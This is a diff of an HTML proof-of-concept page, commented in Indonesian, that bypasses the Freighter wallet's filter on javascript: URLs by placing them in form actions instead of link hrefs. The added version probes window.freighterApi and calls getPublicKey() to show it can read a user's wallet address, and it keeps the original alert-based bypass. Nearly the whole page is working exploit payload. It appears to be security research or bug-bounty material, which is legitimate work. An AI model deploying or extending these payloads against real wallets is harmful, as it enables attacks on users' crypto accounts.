@@ -1,14 +1,21 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h2>Filter Bypass PoC</h2>
 
-<!-- Yang diblock Freighter -->
-<a href="javascript:alert(1)">Ini diblock</a>
+<h3>1. Check Freighter API Exists (Bukti bukan self-XSS)</h3>
+<form action="javascript:alert('FREIGHTER API CHECK:\n\nfreighterApi = ' + typeof window.freighterApi + '\nfreighter = ' + typeof window.freighter)">
+<button>1. Check Freighter API - typeof freighterApi</button>
+</form>
 
-<!-- Yang LUPA diblock = BYPASS kamu 09.38 -->
-<form action="javascript:alert(document.domain)">
-<button type="submit">Ini Lolos - Filter Bypass</button>
+<h3>2. Try Get Address (Impact)</h3>
+<form action="javascript:(async()=>{try{let a=await window.freighterApi.getPublicKey();alert('Got Address: '+a)}catch(e){alert('API exists: '+typeof window.freighterApi+' Error: '+e.message)}})()">
+<button>2. Try Get Public Key</button>
+</form>
+
+<h3>3. Original Bypass kamu 09.51</h3>
+<a href="javascript:alert('0x403for.github.io')">Ini diblock</a><br><br>
+<form action="javascript:alert('1')">
+<button>Ini Lolos - Filter Bypass</button>
 </form>
 
 </body>
